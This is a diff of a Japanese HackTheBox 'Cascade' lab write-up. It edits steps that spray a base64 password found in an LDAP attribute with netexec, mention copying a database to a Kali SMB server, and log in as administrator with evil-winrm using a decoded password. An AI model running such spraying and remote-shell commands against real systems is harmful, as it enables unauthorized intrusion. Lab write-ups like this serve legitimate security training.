@@ -47,24 +47,7 @@ LDAP        10.129.188.71   389    CASC-DC1         j.allen                     
 godapでldapを眺めていると謎の属性「cascadeLegacyPwd」を発見  
 もしやパスワードか  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Cascade_01.png">  
-パスワードスプレーをしたが、ログインできず
-```sh
-└─$ netexec smb 10.129.188.71 -u user.txt  -p 'Clk0bjVldmE=' --continue-on-success
-SMB         10.129.188.71   445    NONE             [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
-SMB         10.129.188.71   445    NONE             [-] cascade.local\arksvc:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\s.smith:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\r.thompson:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\util:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\j.wakefield:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\s.hickson:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\j.goodhand:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\a.turnbull:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\d.burman:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\BackupSvc:Clk0bjVldmE= STATUS_LOGON_FAILURE 
-SMB         10.129.188.71   445    NONE             [-] cascade.local\j.allen:Clk0bjVldmE= STATUS_LOGON_FAILURE
-```
-しかしパスワードはbase64でエンコードされているっぽい  
-デコードした文字列でパスワードスプレー実施、r.thompsonのログイン成功を確認！
+base64デコードした文字列でパスワードスプレー実施、r.thompsonのログイン成功を確認！
 ```sh
 └─$ echo 'Clk0bjVldmE=' | base64 -d
 
@@ -511,7 +494,8 @@ Id  uname   pwd                       domain
 sqlite> SELECT * FROM Misc;
 
 ```
-dbファイルを書き込み可能なフォルダにコピーしてCascAudit.exeの挙動を再度確認、今度はエラーは発生せず
+dbファイルを書き込み可能なフォルダにコピーしてCascAudit.exeの挙動を再度確認、今度はエラーは発生せず  
+kaliのsmbサーバにコピーしdbファイルを再調査
 ```powershell
 *Evil-WinRM* PS C:\Shares\Audit> copy DB\audit.db C:\Users\s.smith\audit.db
 
@@ -751,7 +735,7 @@ whenCreated                     : 1/27/2020 3:23:08 AM
 ```
 base64デコードでadministratorログイン成功！ルートフラグゲット
 ```powershell
-└─$ evil-winrm -i 10.129.93.212 -u administrator -p $(echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d) 
+└─$ evil-winrm -i 10.129.188.71 -u administrator -p $(echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d) 
                                         
 Evil-WinRM shell v3.7
                                         
